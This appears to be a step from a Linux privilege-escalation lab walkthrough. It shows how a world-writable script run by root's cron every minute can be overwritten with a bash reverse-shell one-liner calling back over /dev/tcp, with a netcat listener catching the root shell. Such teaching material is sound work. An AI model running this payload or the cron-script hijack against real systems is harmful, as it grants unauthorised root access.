Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at /etc/crontab.

View the contents of the system-wide crontab:

cat /etc/crontab

There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.

Locate the full path of the overwrite.sh file:

locate overwrite.sh

Note that the file is world-writable:

ls -l /usr/local/bin/overwrite.sh

Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box.

#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1

Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.

nc -nvlp 4444
